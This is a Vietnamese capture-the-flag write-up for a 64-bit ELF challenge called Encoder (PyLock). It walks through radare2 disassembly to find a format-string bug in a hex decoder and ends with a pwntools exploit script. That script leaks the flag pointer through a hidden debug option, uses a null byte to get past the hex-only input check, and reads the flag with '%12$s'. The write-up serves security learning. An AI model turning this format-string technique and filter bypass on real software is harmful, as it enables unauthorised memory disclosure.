# PyLock (ELF exploit-format string)
> Phát hiện ra lỗ hổng bài này easy còn khai thác thì hơi trick 1 tý.Có 1 vài thứ cũng hữu ích khi khai thác bài này.

## Format string detection
Binary nó reimplement lại string.encode('hex'), string.decode('hex') in python2.Việc nhập input/output xuất ra khá tự nhiên nên thử  buffer-overflow + format string thì thấy bị dính fmt thui.

## Security check
Encoder: ELF __64-bit__ LSB __shared object__ x86-64, version 1 (SYSV), __dynamically linked__, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c81f353a80be2437a0357b9b030cebe1935eca59, stripped
```
__root@kali:~/Desktop/tmp/SVATTT-2018/Encoder# checksec --file ./Encoder __
[*] '/root/Desktop/tmp/SVATTT-2018/Encoder/Encoder'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Vậy là một binary bật full chế  độ protection
```
## Binary analysis
> Vs IDA Pro thì F5 reveal gần như tất cả.No mình ở dùng [radare2](https://radare.gitbooks.io/radare2book/) cho nó challange 1 tý.Sử  dụng radare2 như thế nào thì m.n tự tìm hiểu n.

Mình comments, đặt tên hàm cũng khá cẩn thận nên m.n cố gắng đọc.

__In Main__

```
/ (fcn) main 107                                                                                                                                      
|   main (int arg1, int arg2);                                                                                                                        
|           ; var int local_10h @ rbp-0x10                                                                                                            
|           ; var int local_4h @ rbp-0x4                                                                                                              
|           ; DATA XREF from 0x00000add (entry0)                                                                                                      
|           0x000011e5      55             push rbp                                                                                                   
|           0x000011e6      4889e5         mov rbp, rsp                                                                                               
|           0x000011e9      4883ec10       sub rsp, 0x10                                                                                              
|           0x000011ed      897dfc         mov dword [local_4h], edi    ; arg1                                                                        
|           0x000011f0      488975f0       mov qword [local_10h], rsi    ; arg2                                                                       
|           0x000011f4      488d3d450f20.  lea rdi, qword str.         ;[1] ; LEA rdi = [0x202131] = 0xffffffffffffffff "................ _   _       
|           0x000011fb      e8f0f9ffff     call init_envir                                                                                            
|           0x00001200      e84fffffff     call reveal_flag                                                                                           
|           ; CODE XREF from 0x00001247 (main)                                                                                                        
|       .-> 0x00001205      e8f6faffff     call list_options                                                                                          
|       :   0x0000120a      4883f802       cmp rax, 2                  ; jump to decode                                                               
|      ,==< 0x0000120e      7415           je 0x1225                                                                                                  
|      |:   0x00001210      4883f804       cmp rax, 4                  ; jump to debug                                                                
|     ,===< 0x00001214      7416           je 0x122c                                                                                                  
|     ||:   0x00001216      4883f801       cmp rax, 1                  ; jump to encode                                                               
|    ,====< 0x0000121a      7402           je 0x121e                                                                                                  
|   ,=====< 0x0000121c      eb2b           jmp 0x1249                                                                                                 
|   ||||:   ; CODE XREF from 0x0000121a (main)                                                                                                        
|   |`----> 0x0000121e   *  e82bfbffff     call encode                                                                                                
|   |,====< 0x00001223      eb24           jmp 0x1249
|   ||||:   ; CODE XREF from 0x00001214 (main)                                                                                                        
|   ||`---> 0x0000122c      488b05dd0f20.  mov rax, qword [0x00202210] ;[1] ; [0x202210:8]=0                                                          
|   || |:   0x00001233      4889c6         mov rsi, rax                                                                                               
|   || |:   0x00001236      488d3db70100.  lea rdi, qword str.Debug_mode_is_enabled.____p ;[2] ; LEA rdi = [0x13be] = 0x3a656761737365 "essage:" ; 0x1
|   || |:   0x0000123d      b800000000     mov eax, 0                                                                                                 
|   || |:   0x00001242      e819f8ffff     call sym.imp.printf       ; printf("...%p", 0x00202210); ; int printf(const char *format)                  
|   || |`=< 0x00001247      ebbc           jmp 0x1205                                                                                                 
|   || |    ; CODE XREF from 0x0000121c (main)                                                                                                        
|   || |    ; CODE XREF from 0x00001223 (main)                                                                                                        
|   || |    ; CODE XREF from 0x0000122a (main)                                                                                                        
|   ``-`--> 0x00001249      b82a000000     mov eax, 0x2a             ; '*'                                                                            
|           0x0000124e      c9             leave                                                                                                      
\           0x0000124f      c3             ret
```

Ta thấy có một option 4 ẩn, chức năng là in ra pointer at address 0x00202210

Thường mấy hàm được gọi ở đầu hàm main khá quan trọng như là set alarm ...

Đầu tiên là __init_envir__

```
/ (fcn) init_envir 121                                                                                                                                
|   init_envir (int arg1);                                                                                                                            
|           ; var int local_8h @ rbp-0x8                                                                                                              
|           ; CALL XREF from 0x000011fb (main)                                                                                                        
|           0x00000bf0      55             push rbp                                                                                                   
|           0x00000bf1      4889e5         mov rbp, rsp                                                                                               
|           0x00000bf4      4883ec10       sub rsp, 0x10                                                                                              
|           0x00000bf8      48897df8       mov qword [local_8h], rdi    ; arg1                                                                        
|           0x00000bfc      488b05dd1520.  mov rax, qword [obj.stdout] ;[1] ; [0x2021e0:8]=0                                                          
|           0x00000c03   2  b900000000     mov ecx, 0                                                                                                 
|           0x00000c08      ba02000000     mov edx, 2                                                                                                 
|           0x00000c0d      be00000000     mov esi, 0                                                                                                 
|           0x00000c12      4889c7         mov rdi, rax                                                                                               
|           0x00000c15      e886feffff     call sym.imp.setvbuf    ; set buffer mode to stdout ; int setvbuf(FILE*stream, char *buf, int mode, size_t
|           0x00000c1a      488b05df1520.  mov rax, qword [obj.stderr] ;[2] ; [0x202200:8]=0                                                          
|           0x00000c21      b900000000     mov ecx, 0                                                                                                 
|           0x00000c26      ba02000000     mov edx, 2                                                                                                 
|           0x00000c2b      be00000000     mov esi, 0                                                                                                 
|           0x00000c30      4889c7         mov rdi, rax                                                                                               
|           0x00000c33      e868feffff     call sym.imp.setvbuf    ; set buffer mode to stderr ; int setvbuf(FILE*stream, char *buf, int mode, size_t
|           0x00000c38      bf00000000     mov edi, 0                                                                                                 
|           0x00000c3d      e82efeffff     call sym.imp.alarm      ; alarm(0) means do nothing                                                        
|           0x00000c42      488b45f8       mov rax, qword [local_8h]                                                                                  
|           0x00000c46      4889c6         mov rsi, rax                                                                                               
|           0x00000c49      488d3d880600.  lea rdi, qword [0x000012d8] ;[3] ; LEA rdi = [0x127f] = 0x312074ed8548ffff "..H..t 1...." ; "%s"           
|           0x00000c50      b800000000     mov eax, 0                                                                                                 
|           0x00000c55      e806feffff     call sym.imp.printf     ; int printf(const char *format)                                                   
|           0x00000c5a      488d3d7f0600.  lea rdi, qword str.Designed_by_Quang_Nguyen_quangnh89___a_member_of_PiggyBird.__My_blog:_https:__develbranc
|           0x00000c61      e8cafdffff     call sym.imp.puts       ; int puts(const char *s)                                                          
|           0x00000c66      90             nop                                                                                                        
|           0x00000c67      c9             leave                                                                                                      
\           0x00000c68      c3             ret
```
Hàm này không có cả ngoài setvbuf, alarm(0) vs printf(welcome_msg)

In __reveal_flag__

```
/ (fcn) reveal_flag 145                                                                                                                               
|   reveal_flag ();                                                                                                                                   
|           ; var int local_8h @ rbp-0x8                                                                                                              
|           ; CALL XREF from 0x00001200 (main)                                                                                                        
|           0x00001154      55             push rbp                                                                                                   
|           0x00001155      4889e5         mov rbp, rsp                                                                                               
|           0x00001158      4883ec10       sub rsp, 0x10                                                                                              
|           0x0000115c      bf00040000     mov edi, 0x400                                                                                             
|           0x00001161      e832f9ffff     call sym.imp.malloc ;[1] ;  void *malloc(size_t size)                                                      
|           0x00001166      488905a31020.  mov qword [0x00202210], rax    ; [0x202210:8]=0                                                            
|           0x0000116d      488d35780200.  lea rsi, qword [0x000013ec]    ; "rt"                                                                      
|           0x00001174      488d3d740200.  lea rdi, qword str.flag    ; 0x13ef ; "flag"                                                               
|           0x0000117b      e828f9ffff     call sym.imp.fopen  ;[2] ; file*fopen(const char *filename, const char *mode)                              
|           0x00001180      488945f8       mov qword [local_8h], rax    ; local_8h = fopen("flag", "rt")                                              
|           0x00001184      48837df800     cmp qword [local_8h], 0                                                                                    
|       ,=< 0x00001189      7457           je 0x11e2           ;[3] ; if opening flag failed                                                          
|       |   0x0000118b      488b057e1020.  mov rax, qword [0x00202210]    ; [0x202210:8]=0                                                            
|       |   0x00001192      488b55f8       mov rdx, qword [local_8h]                                                                                  
|       |   0x00001196      beff0f0000     mov esi, 0xfff                                                                                             
|       |   0x0000119b      4889c7         mov rdi, rax                                                                                               
|       |   0x0000119e      e8ddf8ffff     call sym.imp.fgets  ;[4] ; read 0xfff chars to 0x00202210 ; char *fgets(char *s, int size, FILE *stream)   
|       |   0x000011a3      ba20000000     mov edx, 0x20       ; "@"                                                                                  
|       |   0x000011a8      be00000000     mov esi, 0                                                                                                 
|       |   0x000011ad      488d3d6c0e20.  lea rdi, qword str.1234567890123456789012345678901    ; 0x202020 ; "1234567890123456789012345678901"       
|       |   0x000011b4      e8aff8ffff     call sym.imp.memset ;[5] ; void *memset(void *s, int c, size_t n)                                          
|       |   0x000011b9      be1f000000     mov esi, 0x1f                                                                                              
|       |   0x000011be      488b45f8       mov rax, qword [local_8h]                                                                                  
|       |   0x000011c2      4889c1         mov rcx, rax                                                                                               
|       |   0x000011c5      ba01000000     mov edx, 1                                                                                                 
|       |   0x000011ca      488d3d4f0e20.  lea rdi, qword str.1234567890123456789012345678901    ; 0x202020 ; "1234567890123456789012345678901"       
|       |   0x000011d1      e862f8ffff     call sym.imp.fread  ;[6] ; read remaining content of flag ; size_t fread(void *ptr, size_t size, size_t nme
|       |   0x000011d6      488b45f8       mov rax, qword [local_8h]                                                                                  
|       |   0x000011da      4889c7         mov rdi, rax                                                                                               
|       |   0x000011dd      e866f8ffff     call sym.imp.fclose ;[7] ; int fclose(FILE *stream)                                                        
|       |   ; CODE XREF from 0x00001189 (reveal_flag)                                                                                                 
|       `-> 0x000011e2   *  90             nop
|           0x000011e3      c9             leave                                                                                                      
\           0x000011e4   *  c3             ret
```

At 1. 0x00202210 = malloc(0x400)

At 2. local_8h = fopen("flag", "rt")

At 3. if failed return
else:

At 4. Read flag content and save to 0x00202210

At 5. Set a global variable x to 0

At 6. Read the remaining content of flag to x

=)) Như vậy là cái address được in ra tại debug(input 4) chính là pointer to flag

Vs format string thì việc đọc memory khá oke.

Xong mấy hàm khởi tạo môi trường.Bi giờ đến hàm chính là hàm decode (tại vì hàm này vunerable)

```
Hàm khá dài nên mình đi từ theo chức năng

| ...
|           0x00000e9b      31c0           xor eax, eax                                                                                               
|           0x00000e9d      488d95f0fbff.  lea rdx, qword [local_410h]                                                                                
|           0x00000ea4      b800000000     mov eax, 0                                                                                                 
|           0x00000ea9      b980000000     mov ecx, 0x80                                                                                              
|           0x00000eae      4889d7         mov rdi, rdx                                                                                               
|           0x00000eb1      f348ab         rep stosq qword [rdi], rax

=)) memset(local_410h, 0, 0x80*4)

|           0x00000eb4      488d3de60400.  lea rdi, qword str.Enter_your_message:    ; 0x13a1 ; "Enter your message:"                                 
|           0x00000ebb      e870fbffff     call sym.imp.puts ;[1] ; int puts(const char *s)                                                           
|           0x00000ec0      488b05291320.  mov rax, qword [obj.stdin]    ; [0x2021f0:8]=0                                                             
|           0x00000ec7      4889c7         mov rdi, rax                                                                                               
|           0x00000eca      e871fbffff     call sym.imp.__fpurge ;[2]

=)) puts("Enter your message:"); fpurge(stdin)

|           0x00000ecf      488b151a1320.  mov rdx, qword [obj.stdin]    ; [0x2021f0:8]=0                                                             
|           0x00000ed6      b900040000     mov ecx, 0x400                                                                                             
|           0x00000edb      488d85f0fbff.  lea rax, qword [local_410h]                                                                                
|           0x00000ee2      89ce           mov esi, ecx                                                                                               
|           0x00000ee4      4889c7         mov rdi, rax                                                                                               
|           0x00000ee7      e894fbffff     call sym.imp.fgets ;[3] ; char *fgets(char *s, int size, FILE *stream)

=)) fgets(local_410h, 0x400, stdin)

|           0x00000ef3   *  0fb600         movzx eax, byte [rax]                                                                                      
|           0x00000ef6      84c0           test al, al                                                                                                
|       ,=< 0x00000ef8      743a           je 0xf34      ;[4]                                                                                         
|       |   0x00000efa      488d85f0fbff.  lea rax, qword [local_410h]                                                                                
|       |   0x00000f01      4889c7         mov rdi, rax                                                                                               
|       |   0x00000f04      e847fbffff     call sym.imp.strlen ;[5] ; size_t strlen(const char *s)                                                    
|       |   0x00000f09      4883e801       sub rax, 1                                                                                                 
|       |   0x00000f0d      0fb68405f0fb.  movzx eax, byte [rbp + rax - 0x410]                                                                        
|       |   0x00000f15      3c0a           cmp al, 0xa                                                                                                
|      ,==< 0x00000f17      751b           jne 0xf34     ;[4]                                                                                         
|      ||   0x00000f19      488d85f0fbff.  lea rax, qword [local_410h]                                                                                
|      ||   0x00000f20      4889c7         mov rdi, rax                                                                                               
|      ||   0x00000f23      e828fbffff     call sym.imp.strlen ;[5] ; size_t strlen(const char *s)                                                    
|      ||   0x00000f28      4883e801       sub rax, 1                                                                                                 
|      ||   0x00000f2c      c68405f0fbff.  mov byte [rbp + rax - 0x410], 0                                                                            
|      ||   ; CODE XREF from 0x00000ef8 (decode)                                                                                                      
|      ||   ; CODE XREF from 0x00000f17 (decode)
|      ``-> 0x00000f34      488d85f0fbff.  lea rax, qword [local_410h]
| ...                                                                              

=))
if (local_410h[0]){ // replace newline with null
  rax = strlen(local_410h - 1)
  if (local_410h[rax] == '\n')
    local_410h[rax] = '\x00';
}

|       `-> 0x00000f34      488d85f0fbff.  lea rax, qword [local_410h]                                                                                
|           0x00000f3b      4889c7         mov rdi, rax                                                                                               
|           0x00000f3e      e80dfbffff     call sym.imp.strlen ;[1] ; size_t strlen(const char *s)                                                    
|           0x00000f43      488985e0fbff.  mov qword [local_420h], rax                                                                                
|           0x00000f4a      4883bde0fbff.  cmp qword [local_420h], 0                                                                                  
|       ,=< 0x00000f52      740f           je 0xf63    ;[3]                                                                                           
|       |   0x00000f54      488b85e0fbff.  mov rax, qword [local_420h]                                                                                
|       |   0x00000f5b      83e001         and eax, 1                                                                                                 
|       |   0x00000f5e      4885c0         test rax, rax                                                                                              
|      ,==< 0x00000f61   *  7411           je 0xf74    ;[4]                                                                                           
|      ||   ; CODE XREF from 0x00000f52 (decode)                                                                                                      
|      |`-> 0x00000f63      488d3d610400.  lea rdi, qword str.Invalid_message    ; 0x13cb ; "Invalid message"                                         
|      |    0x00000f6a      e8c1faffff     call sym.imp.puts ;[5] ; int puts(const char *s)                                                           
|      |,=< 0x00000f6f      e9ca010000     jmp 0x113e  ;[6]                                                                                           
|      ||   ; CODE XREF from 0x00000f61 (decode)                                                                                                      
|      `--> 0x00000f74      488d3d600400.  lea rdi, qword str.Decoded_message:    ; 0x13db ; "Decoded message:"

if (!strlen(local_410h) ||  strlen(local_410h) % 2){
  puts("Invalid message");
  return;
}

|      |`-> 0x00000f74      488d3d600400.  lea rdi, qword str.Decoded_message:    ; 0x13db ; "Decoded message:"                                       
|      |    0x00000f7b      e8b0faffff     call sym.imp.puts ;[2] ; int puts(const char *s)                                                           
|      |    0x00000f80      488b85e0fbff.  mov rax, qword [lenOfMsg]                                                                                  
|      |    0x00000f87      4883c002       add rax, 2                                                                                                 
|      |    0x00000f8b      4889c7         mov rdi, rax                                                                                               
|      |    0x00000f8e      e805fbffff     call sym.imp.malloc ;[4] ;  void *malloc(size_t size)                                                      
|      |    0x00000f93      488985e8fbff.  mov qword [new_mem], rax                                                                                   
|      |    0x00000f9a      4883bde8fbff.  cmp qword [new_mem], 0                                                                                     
|      |,=< 0x00000fa2      0f8495010000   je 0x113d ;[5]                                                                                             
|      ||   0x00000fa8      488b85e0fbff.  mov rax, qword [lenOfMsg]                                                                                  
|      ||   0x00000faf      488d5002       lea rdx, qword [rax + 2]                                                                                   
|      ||   0x00000fb3      488b85e8fbff.  mov rax, qword [new_mem]                                                                                   
|      ||   0x00000fba      be00000000     mov esi, 0                                                                                                 
|      ||   0x00000fbf      4889c7         mov rdi, rax                                                                                               
|      ||   0x00000fc2   *  e8a1faffff     call sym.imp.memset ;[6] ; void *memset(void *s, int c, size_t n)

lenOfMsg = local_420h = strlen(msg)
puts(Decoded message:");
new_mem = malloc(lenOfMsg + 2);
memset(new_mem, 0, lenOfMsg + 2);

|       |   0x00000fc7      c785d8fbffff.  mov dword [new_mem_i], 0                                                                                   
|       |   0x00000fd1      c785dcfbffff.  mov dword [i], 0                                                                                           
|       |   ; CODE XREF from 0x000010d5 (decode)                                                                                                      
|       |   0x00000fdb      8b85dcfbffff   mov eax, dword [i]                                                                                         
|       |   0x00000fe1      483b85e0fbff.  cmp rax, qword [lenOfMsg]                                                                                  
|      ,==< 0x00000fe8      0f83ec000000   jae 0x10da ;[4] ; if i >= lenOfMsg                                                                         
|      ||   0x00000fee      8b85dcfbffff   mov eax, dword [i]    ; start of checking msg[i]                                                           
|      ||   0x00000ff4      0fb68405f0fb.  movzx eax, byte [rbp + rax - 0x410]    ; eax = msg[i]                                                      
|      ||   0x00000ffc      0fbec0         movsx eax, al                                                                                              
|      ||   ; DATA XREF from 0x00001196 (reveal_flag)                                                                                                 
|      ||   0x00000fff      4863d0         movsxd rdx, eax                                                                                            
|      ||   0x00001002      488d05371020.  lea rax, qword [0x00202040]                                                                                
|      ||   0x00001009   *  0fb60402       movzx eax, byte [rdx + rax]    ; eax = 0x00202040[msg[i]]                                                  
|      ||   0x0000100d      3cff           cmp al, 0xff                                                                                               
|     ,===< 0x0000100f      7428           je 0x1039 ;[5] ; end of checking msg[i]                                                                    
|     |||   0x00001011      8b85dcfbffff   mov eax, dword [i]    ; start of checking msg[i + 1]                                                       
|     |||   0x00001017      83c001         add eax, 1                                                                                                 
|     |||   0x0000101a      89c0           mov eax, eax                                                                                               
|     |||   0x0000101c      0fb68405f0fb.  movzx eax, byte [rbp + rax - 0x410]                                                                        
|     |||   0x00001024      0fbec0         movsx eax, al                                                                                              
|     |||   0x00001027      4863d0         movsxd rdx, eax                                                                                            
|     |||   0x0000102a      488d050f1020.  lea rax, qword [0x00202040]                                                                                
|     |||   0x00001031      0fb60402       movzx eax, byte [rdx + rax]                                                                                
|     |||   0x00001035      3cff           cmp al, 0xff                                                                                               
|    ,====< 0x00001037      7520           jne 0x1059 ;[6] ; end of checking msg[i+1]                                                                 
|       :   ; CODE XREF from 0x0000100f (decode)                                                                                                      
|       :   0x00001039      488d3d8b0300.  lea rdi, qword str.Invalid_message    ; 0x13cb ; "Invalid message"                                         
|       :   0x00001040      e8ebf9ffff     call sym.imp.puts ;[1] ; int puts(const char *s)                                                           
|       :   0x00001045      488b85e8fbff.  mov rax, qword [new_mem]                                                                                   
|       :   0x0000104c      4889c7         mov rdi, rax                                                                                               
|       :   0x0000104f      e8ccf9ffff     call sym.imp.free ;[2] ; void free(void *ptr)                                                              
|      ,==< 0x00001054      e9e5000000     jmp 0x113e ;[3]                                                                                            
|      |:   ; CODE XREF from 0x00001037 (decode)                                                                                                      
|      |:   0x00001059      8b85dcfbffff   mov eax, dword [i]    ; start of convert hex (vd: 0xFF) to int num                                         
|      |:   0x0000105f      0fb68405f0fb.  movzx eax, byte [rbp + rax - 0x410]                                                                        
|      |:   0x00001067      0fbec0         movsx eax, al                                                                                              
|      |:   0x0000106a      4863d0         movsxd rdx, eax                                                                                            
|      |:   0x0000106d      488d05cc0f20.  lea rax, qword [0x00202040]                                                                                
|      |:   0x00001074      0fb60402       movzx eax, byte [rdx + rax]                                                                                
|      |:   0x00001078      c1e004         shl eax, 4                                                                                                 
|      |:   0x0000107b      89c1           mov ecx, eax                                                                                               
|      |:   0x0000107d      8b85dcfbffff   mov eax, dword [i]                                                                                         
|      |:   0x00001083      83c001         add eax, 1                                                                                                 
|      |:   0x00001086      89c0           mov eax, eax                                                                                               
|      |:   0x00001088      0fb68405f0fb.  movzx eax, byte [rbp + rax - 0x410]                                                                        
|      |:   0x00001090      0fbec0         movsx eax, al                                                                                              
|      |:   0x00001093      4863d0         movsxd rdx, eax                                                                                            
|      |:   0x00001096      488d05a30f20.  lea rax, qword [0x00202040]                                                                                
|      |:   0x0000109d      0fb60402       movzx eax, byte [rdx + rax]                                                                                
|      |:   0x000010a1      01c8           add eax, ecx    ; end of the convert                                                                       
|      |:   0x000010a3      8885d7fbffff   mov byte [tmp_char], al    ; save the int to tmp_char                                                      
|      |:   0x000010a9      8385dcfbffff.  add dword [i], 2    ; update i (i += 2)                                                                    
|      |:   0x000010b0      8b85d8fbffff   mov eax, dword [new_mem_i]    ; x = new_mem_i                                                              
|      |:   0x000010b6      8d5001         lea edx, dword [rax + 1]                                                                                   
|      |:   0x000010b9      8995d8fbffff   mov dword [new_mem_i], edx    ; new_mem_i += 1                                                             
|      |:   0x000010bf      4863d0         movsxd rdx, eax                                                                                            
|      |:   0x000010c2      488b85e8fbff.  mov rax, qword [new_mem]                                                                                   
|      |:   0x000010c9      4801c2         add rdx, rax    ; '#'                                                                                      
|      |:   0x000010cc      0fb685d7fbff.  movzx eax, byte [tmp_char]                                                                                 
|      |:   0x000010d3      8802           mov byte [rdx], al    ; new_mem[x] = tmp_char                                                              
|      |`=< 0x000010d5   *  e901ffffff     jmp 0xfdb ;[4]

i = 0;
new_mem_i = 0;
while(i < lenOfMsg){
  if (0x00202040[msg[i]] == -1 || 0x00202040[msg[i+1]] == -1){
    puts("Invalid message");
    return;
  }
  char tmp_char = 0x00202040[msg[i]] << 4 +   0x00202040[msg[i + 1]];
  new_mem[new_mem_i ++] = tmp_char;
  i += 2;
}

dump memory of 0x00202040
:> px @ 0x00202040
- offset - | 0 1  2 3  4 5  6 7  8 9  A B  C D  E F| 0123456789ABCDEF
0x00202040 |ffff ffff ffff ffff ffff ffff ffff ffff| ................
0x00202050 |ffff ffff ffff ffff ffff ffff ffff ffff| ................
0x00202060 |ffff ffff ffff ffff ffff ffff ffff ffff| ................
0x00202070 |0001 0203 0405 0607 0809 ffff ffff ffff| ................
0x00202080 |ff0a 0b0c 0d0e 0fff ffff ffff ffff ffff| ................
0x00202090 |ffff ffff ffff ffff ffff ffff ffff ffff| ................
0x002020a0 |ff0a 0b0c 0d0e 0fff ffff ffff ffff ffff| ................
0x002020b0 |ffff ffff ffff ffff ffff ffff ffff ffff| ................
0x002020c0 |ffff ffff ffff ffff ffff ffff ffff ffff| ................
0x002020d0 |ffff ffff ffff ffff ffff ffff ffff ffff| ................
0x002020e0 |ffff ffff ffff ffff ffff ffff ffff ffff| ................
0x002020f0 |ffff ffff ffff ffff ffff ffff ffff ffff| ................
0x00202100 |ff                                     | .

Như vậy object này mục đích giới hạn input nhập vào chỉ chứa kí tự base 16.

và phần cuối cùng

|           ; CODE XREF from 0x00000fe8 (decode)                                                                                                      
|           0x000010da      8b85d8fbffff   mov eax, dword [new_mem_i]                                                                                 
|           0x000010e0      8d5001         lea edx, dword [rax + 1]                                                                                   
|           0x000010e3      8995d8fbffff   mov dword [new_mem_i], edx    ; new_mem_i += 1                                                             
|           0x000010e9      4863d0         movsxd rdx, eax                                                                                            
|           0x000010ec      488b85e8fbff.  mov rax, qword [new_mem]                                                                                   
|           0x000010f3   *  4801d0         add rax, rdx    ; '('                                                                                      
|           0x000010f6      c6000a         mov byte [rax], 0xa    ; new_mem[new_mem_i - 1] = newline                                                  
|           0x000010f9      8b85d8fbffff   mov eax, dword [new_mem_i]                                                                                 
|           0x000010ff      8d5001         lea edx, dword [rax + 1]                                                                                   
|           0x00001102      8995d8fbffff   mov dword [new_mem_i], edx    ; new_mem_i += 1                                                             
|           0x00001108      4863d0         movsxd rdx, eax                                                                                            
|           0x0000110b      488b85e8fbff.  mov rax, qword [new_mem]                                                                                   
|           0x00001112      4801d0         add rax, rdx    ; '('                                                                                      
|           0x00001115      c60000         mov byte [rax], 0    ; new_mem[new_mem_i - 1] = null                                                       
|           0x00001118      488b85e8fbff.  mov rax, qword [new_mem]                                                                                   
|           0x0000111f      4889c7         mov rdi, rax                                                                                               
|           0x00001122      b800000000     mov eax, 0                                                                                                 
|           0x00001127      e834f9ffff     call sym.imp.printf ;[2] ; int printf(const char *format)                                                  
|           0x0000112c      488b85e8fbff.  mov rax, qword [new_mem]                                                                                   
|           0x00001133      4889c7         mov rdi, rax                                                                                               
|           0x00001136      e8e5f8ffff     call sym.imp.free ;[3] ; void free(void *ptr)                                                              
|       ,=< 0x0000113b      eb01           jmp 0x113e ;[4]
| ... return

new_mem[new_mem_i++] = '\n'
new_mem[new_mem_i++] = '\x00'
printf(new_mem) =)) vulnerable here
free(new_mem)

Vậy là analysis xong, bước này là ko cần thiết và ko thực tế trong các bài phức tạp no mà luyện reading assembly code thì cũng khá hữu ích chứ.

```
## Exploitation

Stack tại lúc trước lúc gọi printf(msg) with decode input là "AAAABBBBCCCCDDDD"

```
:> pxr @ rsp
0x7ffe2daf1f20 |0xdd00000000000015   ........ @rsp
0x7ffe2daf1f28 |0x000000100000000a   ........
0x7ffe2daf1f30 |0x0000000000000010   ........
0x7ffe2daf1f38 |0x000055bb8a92fcb0   .....U.. rdi
0x7ffe2daf1f40 |0x4242424241414141   AAAABBBB ascii
0x7ffe2daf1f48 |0x4444444443434343   CCCCDDDD ascii
0x7ffe2daf1f50 |0x0000000000000000   ........ rsi
0x7ffe2daf1f58 |0x0000000000000000   ........ rsi
0x7ffe2daf1f60 |0x0000000000000000   ........ rsi
0x7ffe2daf1f68 |0x0000000000000000   ........ rsi
0x7ffe2daf1f70 |0x0000000000000000   ........ rsi
0x7ffe2daf1f78 |0x0000000000000000   ........ rsi
```

Các bước:
* Lấy address of flag-revealed memory in debug option
* Craft payload để read that memory

Vấn đề ở đây là payload phải chứa address of flag nhưng mà nó đã được check chỉ cho phép các kí tự base 16.Làm sao để bypass nó ?

Câu trả lời nếu để ý hàm check thì nó chỉ check tại index [0, strlen(msg) - 1] mà hàm nhập input lại là fgets
nên nếu payload có dạng "AAAA\x00BBBB" thì "BBBB" ko được check.

Payload có dạng: ("padding.%x$s.padding" + '\x00' +  p64(flag_addr)).encode('hex') (x là index pointing to flag)

```
Your choice:1
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Encoded message:
414141412e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e2570

Your choice:2
Enter your message:
414141412e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e25702e2570
Decoded message:
AAAA.(nil).0x5f.0x70.0x3.0x7f9aa446c4c0.0x70007f9aa432dc50.0xbc00000060.0xbc.0x564424586cb0.0x3134313431343134.0x6532303735326532.0x3532653230373532.0x3037353265323037.0x6532303735326532.0x3532653230373532.0x3037353265323037.0x6532303735326532.0x3532653230373532.0x3037353265323037.0x6532303735326532.0x3532653230373532.0x3037353265323037.0x6532303735326532.0x3532653230373532.0x3037353265323037.0x6532303735326532.0x3532653230373532.0x3037353265323037.0x6532303735326532.0x3532653230373532

41414141 -> 0x3134313431343134 nên offset to AAAA.%p. là 10 (vì cần padding nên sẽ cần bù trừ thêm)
```

### Final payload
```python
from pwn import *

def choose(io, num):
    io.sendlineafter('Your choice:', str(num))

def exploit():
    io = process('./Encoder')
    choose(io, 4)
    io.recvline()
    flag = int(io.recvline().strip(), 16)
    print "[*] flag at: {}".format(hex(flag))

    payload = '%12$s'.encode('hex')
    payload += '\x00'*6 # multiple of 8 qword
    payload += p64(flag)

    print '[*] payload: {}'.format(payload)

    choose(io, 2)
    io.sendline(payload)
    print io.recv()

if __name__ == "__main__":
    exploit()
```

> Bye.
